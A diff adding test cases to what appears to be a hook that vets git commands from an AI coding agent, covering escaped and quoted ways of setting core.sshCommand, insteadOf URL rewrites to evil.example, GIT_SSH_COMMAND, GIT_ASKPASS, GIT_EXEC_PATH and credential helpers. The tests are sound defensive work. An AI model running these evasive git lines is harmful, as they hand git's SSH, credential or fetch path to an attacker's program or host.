@@ -332,6 +332,26 @@ describe("on every executor, however the line reaches git", () => {
     // A key as the shell hands it to git, its backslashes applied.
     ["git -c cred\\ential.helper=/tmp/h fetch", "credential.helper"],
     ["git config cred\\ential.helper /tmp/h", "credential.helper"],
+    // An escaped `=` ends no key: the shell hands git the word without its
+    // backslash, and git splits a `-c` at its first `=`.
+    ["git -c core.sshCommand\\=/tmp/evil fetch", "core.sshCommand"],
+    ["git -c url.https://evil.example/.insteadOf\\=https://github.com/ fetch", "url.https://evil.example/.insteadOf"],
+    // git splits a `--config-env` at its last `=`, since the variable's name holds none.
+    ["git --config-env 'url.https://e/?a=b.insteadOf=V' fetch", "url.https://e/?a=b.insteadOf"],
+    ["git --config-env='url.https://e/?a=b.insteadOf=V' fetch", "url.https://e/?a=b.insteadOf"],
+    // `env` and the assigning builtins are handed their words without quotes or backslashes.
+    ["env 'GIT_SSH_COMMAND=/tmp/x' git fetch", "GIT_SSH_COMMAND"],
+    ["env -i \"GIT_ASKPASS=/tmp/x\" git fetch", "GIT_ASKPASS"],
+    ["env GIT_\\SSH=/tmp/x git fetch", "GIT_SSH"],
+    ["export 'GIT_SSH_COMMAND=/tmp/x'; git fetch", "GIT_SSH_COMMAND"],
+    ["declare -x \"GIT_CONFIG_PARAMETERS='credential.helper=store'\"; git fetch", "credential.helper"],
+    // `env` reads every operand holding an `=` as an assignment, whatever its name.
+    ["env 1=2 GIT_SSH_COMMAND=/tmp/x git fetch", "GIT_SSH_COMMAND"],
+    ["env 'A B=1' GIT_SSH_COMMAND=/tmp/x git fetch", "GIT_SSH_COMMAND"],
+    // `NAME+=value` appends to NAME, in front of git and through a builtin.
+    ["GIT_SSH_COMMAND+=/tmp/x git fetch", "GIT_SSH_COMMAND"],
+    ["export GIT_ASKPASS+=/tmp/x; git fetch", "GIT_ASKPASS"],
+    ["declare -x 'GIT_EXEC_PATH+=/tmp/x'; git status", "GIT_EXEC_PATH"],
   ];
 
   for (const [line, target] of REFUSED) {
@@ -361,6 +381,12 @@ describe("on every executor, however the line reaches git", () => {
     "env -i git status",
     "git --exec-path",
     "GIT_CONFIG_PARAMETERS=\"'color.ui'='always'\" git status",
+    // An escaped blank in a value is part of it, and the key before the `=` is `user.name`.
+    "git -c user.name=a\\ b log",
+    // `env` sets `GIT_SSH_COMMAND+`, a variable git never reads.
+    "env GIT_SSH_COMMAND+=/tmp/x git fetch",
+    // A quoted name in front of a program is that program's name, not an assignment.
+    "'GIT_SSH_COMMAND=/tmp/x' git fetch",
   ]) {
     it(`admits ${JSON.stringify(line)} on the hook, where the allow list is what decides it`, () => {
       expect(claude(line), line).toMatchObject({ decision: "allowed", rule: null });
